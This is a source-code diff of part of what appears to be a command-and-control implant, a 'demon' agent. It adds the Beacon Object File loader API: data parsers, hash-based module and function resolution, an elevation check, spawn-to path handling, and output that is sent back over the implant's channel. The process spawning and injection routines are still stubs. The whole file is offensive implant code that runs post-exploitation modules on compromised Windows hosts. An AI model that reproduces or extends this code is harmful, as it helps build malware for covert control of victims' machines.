@@ -13,19 +13,37 @@
 
 #include <Loader/ObjectApi.h>
 
-#define intAlloc( size )    Instance->Win32.LocalAlloc( LPTR, size )
-#define intFree( addr )     Instance->Win32.LocalFree( addr )
+#define intAlloc( size )    Instance.Win32.LocalAlloc( LPTR, size )
+#define intFree( addr )     Instance.Win32.LocalFree( addr )
 
 #ifndef bufsize
 #define bufsize 8192
 #endif
 
+// Meh some wrapper functions for internal demon GetProcAddress and GetModuleHandleA functions.
+PVOID LdrModulePebString( PCHAR ModuleString )
+{
+    PRINTF( "ModuleString: %s : %lx\n", ModuleString, HashEx( ModuleString, 0, TRUE ) )
+    return Instance.Win32.GetModuleHandleA( ModuleString );
+}
+
+PVOID LdrFunctionAddrString( PVOID Module, PCHAR Function )
+{
+    PRINTF( "Module:[%p] Function:[%s : %lx]\n", Module, Function, HashStringA( Function ) )
+    return LdrFunctionAddr( Module, HashStringA( Function ) );
+}
+
+BOOL LdrFreeLibrary( HMODULE hLibModule )
+{
+    return TRUE;
+}
+
 COFFAPIFUNC BeaconApi[] = {
-        { .NameHash = COFFAPI_BEACONDATAPARSER,             .Pointer = ParserNew                        },
-        { .NameHash = COFFAPI_BEACONDATAINT,                .Pointer = ParserGetInt32                   },
+        { .NameHash = COFFAPI_BEACONDATAPARSER,             .Pointer = BeaconDataParse                  },
+        { .NameHash = COFFAPI_BEACONDATAINT,                .Pointer = BeaconDataInt                    },
         { .NameHash = COFFAPI_BEACONDATASHORT,              .Pointer = BeaconDataShort                  },
         { .NameHash = COFFAPI_BEACONDATALENGTH,             .Pointer = BeaconDataLength                 },
-        { .NameHash = COFFAPI_BEACONDATAEXTRACT,            .Pointer = ParserGetBytes                   },
+        { .NameHash = COFFAPI_BEACONDATAEXTRACT,            .Pointer = BeaconDataExtract                },
         { .NameHash = COFFAPI_BEACONFORMATALLOC,            .Pointer = BeaconFormatAlloc                },
         { .NameHash = COFFAPI_BEACONFORMATRESET,            .Pointer = BeaconFormatReset                },
         { .NameHash = COFFAPI_BEACONFORMATFREE,             .Pointer = BeaconFormatFree                 },
@@ -46,11 +64,13 @@ COFFAPIFUNC BeaconApi[] = {
 
         { .NameHash = COFFAPI_TOWIDECHAR,                   .Pointer = toWideChar                       },
         { .NameHash = COFFAPI_LOADLIBRARYA,                 .Pointer = LdrModuleLoad                    },
-        { .NameHash = COFFAPI_GETPROCADDRESS,               .Pointer = NULL                             }, // TODO: add this
-        { .NameHash = COFFAPI_FREELIBRARY,                  .Pointer = NULL                             }, // TODO: add this
-};
+        { .NameHash = COFFAPI_GETMODULEHANDLE,              .Pointer = LdrModulePebString               },
+        { .NameHash = COFFAPI_GETPROCADDRESS,               .Pointer = LdrFunctionAddrString            },
+        { .NameHash = COFFAPI_FREELIBRARY,                  .Pointer = LdrFreeLibrary                   }, // TODO: add this
 
-DWORD BeaconApiCounter = 25;
+        // End of array
+        { .NameHash = NULL, .Pointer = NULL },
+};
 
 uint32_t swap_endianess(uint32_t indata) {
     uint32_t testint = 0xaabbccdd;
@@ -64,21 +84,77 @@ uint32_t swap_endianess(uint32_t indata) {
     return outint;
 }
 
+VOID BeaconDataParse( PDATA parser, PCHAR buffer, INT size )
+{
+    if ( parser == NULL )
+        return;
+
+    parser->original = buffer;
+    parser->buffer   = buffer;
+    parser->length   = size - 4;
+    parser->size     = size - 4;
+    parser->buffer   += 4;
+}
+
+INT BeaconDataInt( PDATA parser )
+{
+    UINT32 Value = 0;
+
+    if ( parser->length < 4 )
+        return 0;
+
+    MemCopy( &Value, parser->buffer, 4 );
+
+    parser->buffer += 4;
+    parser->length -= 4;
+
+    return ( INT ) Value;
+}
+
+SHORT BeaconDataShort( datap* parser )
+{
+    UINT16 Value = 0;
+
+    if ( parser->length < 2 )
+        return 0;
+
+    MemCopy( &Value, parser->buffer, 2 );
+
+    parser->buffer += 2;
+    parser->length -= 2;
+
+    return ( short ) Value;
+}
+
 INT BeaconDataLength( PDATA parser )
 {
     return parser->length;
 }
 
-short BeaconDataShort(datap* parser)
+PCHAR BeaconDataExtract( PDATA parser, PINT size )
 {
-    UINT16 retvalue = 0;
-    if (parser->length < 2) {
-        return 0;
-    }
-    memcpy(&retvalue, parser->buffer, 2);
-    parser->buffer += 2;
-    parser->length -= 2;
-    return (short)retvalue;
+    INT   Length = 0;
+    PVOID Data   = NULL;
+
+    if ( parser->length < 4 )
+        return NULL;
+
+    MemCopy( &Length, parser->buffer, 4 );
+
+    parser->buffer += 4;
+
+    Data = parser->buffer;
+    if ( Data == NULL )
+        return NULL;
+
+    parser->length -= 4;
+    parser->length -= Length;
+    parser->buffer += Length;
+
+    if ( size != NULL )
+        *size = Length;
+
+    return Data;
 }
 
 VOID BeaconPrintf( INT Type, PCHAR fmt, ... )
@@ -92,10 +168,10 @@ VOID BeaconPrintf( INT Type, PCHAR fmt, ... )
 
     va_start( VaListArg, fmt );
 
-    CallbackSize    = Instance->Win32.vsnprintf( NULL, 0, fmt, VaListArg );
-    CallbackOutput  = Instance->Win32.LocalAlloc( LPTR, CallbackSize );
+    CallbackSize    = Instance.Win32.vsnprintf( NULL, 0, fmt, VaListArg );
+    CallbackOutput  = Instance.Win32.LocalAlloc( LPTR, CallbackSize );
 
-    Instance->Win32.vsnprintf( CallbackOutput, CallbackSize, fmt, VaListArg );
+    Instance.Win32.vsnprintf( CallbackOutput, CallbackSize, fmt, VaListArg );
 
     va_end( VaListArg );
 
@@ -106,7 +182,7 @@ VOID BeaconPrintf( INT Type, PCHAR fmt, ... )
     PackageTransmit( package, NULL, NULL );
 
     MemSet( CallbackOutput, 0, CallbackSize );
-    Instance->Win32.LocalFree( CallbackOutput );
+    Instance.Win32.LocalFree( CallbackOutput );
 }
 
 // TODO: use type for output or error
@@ -128,19 +204,19 @@ BOOL BeaconIsAdmin()
     DWORD           cbSize    = sizeof( TOKEN_ELEVATION );
     NTSTATUS        NtStatus  = STATUS_SUCCESS;
 
-    if ( NT_SUCCESS( NtStatus = Instance->Syscall.NtOpenProcessToken( NtCurrentProcess(), TOKEN_QUERY, &hToken ) ) )
+    if ( NT_SUCCESS( NtStatus = Instance.Syscall.NtOpenProcessToken( NtCurrentProcess(), TOKEN_QUERY, &hToken ) ) )
     {
-        if ( Instance->Win32.GetTokenInformation( hToken, TokenElevation, &Elevation, sizeof( Elevation ), &cbSize ) )
+        if ( Instance.Win32.GetTokenInformation( hToken, TokenElevation, &Elevation, sizeof( Elevation ), &cbSize ) )
         {
-            Instance->Win32.NtClose( hToken );
+            Instance.Win32.NtClose( hToken );
             return ( BOOL ) Elevation.TokenIsElevated;
         }
         else PRINTF( "GetTokenInformation: Failed [%d]\n", NtGetLastError() );
     }
-    else PRINTF( "NtOpenProcessToken: Failed [%d]\n", Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
+    else PRINTF( "NtOpenProcessToken: Failed [%d]\n", Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
 
     if ( hToken )
-        Instance->Win32.NtClose( hToken );
+        Instance.Win32.NtClose( hToken );
 
     return FALSE;
 }
@@ -150,7 +226,7 @@ VOID BeaconFormatAlloc( PFORMAT format, int maxsz )
     if ( format == NULL )
         return;
 
-    format->original = Instance->Win32.LocalAlloc(maxsz, 1);
+    format->original = Instance.Win32.LocalAlloc(maxsz, 1);
     format->buffer = format->original;
     format->length = 0;
     format->size = maxsz;
@@ -170,7 +246,7 @@ VOID BeaconFormatFree( PFORMAT format )
 
     if ( format->original )
     {
-        Instance->Win32.LocalFree( format->original );
+        Instance.Win32.LocalFree( format->original );
         format->original = NULL;
     }
 
@@ -192,7 +268,7 @@ VOID BeaconFormatPrintf( PFORMAT format, char* fmt, ... )
     int     length = 0;
 
     va_start( args, fmt );
-    length = Instance->Win32.vsnprintf( NULL, 0, fmt, args );
+    length = Instance.Win32.vsnprintf( NULL, 0, fmt, args );
     va_end( args );
     if ( format->length + length > format->size )
     {
@@ -200,7 +276,7 @@ VOID BeaconFormatPrintf( PFORMAT format, char* fmt, ... )
     }
 
     va_start( args, fmt );
-    Instance->Win32.vsnprintf( format->buffer, length, fmt, args );
+    Instance.Win32.vsnprintf( format->buffer, length, fmt, args );
     va_end( args );
 
     format->length += length;
@@ -247,9 +323,9 @@ VOID BeaconGetSpawnTo( BOOL x86, char* buffer, int length )
         return;
 
     if ( x86 )
-        Path = Instance->Config.Process.Spawn86;
+        Path = Instance.Config.Process.Spawn86;
     else
-        Path = Instance->Config.Process.Spawn86;
+        Path = Instance.Config.Process.Spawn64;
 
     Size = StringLengthA( Path );
 
@@ -257,10 +333,9 @@ VOID BeaconGetSpawnTo( BOOL x86, char* buffer, int length )
         return;
 
     MemCopy( buffer, Path, Size );
-
 }
 
-BOOL BeaconSpawnTemporaryProcess(BOOL x86, BOOL ignoreToken, STARTUPINFO * sInfo, PROCESS_INFORMATION * pInfo)
+BOOL BeaconSpawnTemporaryProcess( BOOL x86, BOOL ignoreToken, STARTUPINFO* sInfo, PROCESS_INFORMATION* pInfo )
 {
     // TODO: handle this
 }
@@ -275,12 +350,12 @@ VOID BeaconInjectTemporaryProcess( PROCESS_INFORMATION* pInfo, char* payload, in
     // TODO: handle this
 }
 
-VOID BeaconCleanupProcess(PROCESS_INFORMATION* pInfo)
+VOID BeaconCleanupProcess( PROCESS_INFORMATION* pInfo )
 {
     // TODO: handle this
 }
 
-BOOL toWideChar(char* src, wchar_t* dst, int max)
+BOOL toWideChar( char* src, wchar_t* dst, int max )
 {
     // TODO: handle this
     return FALSE;
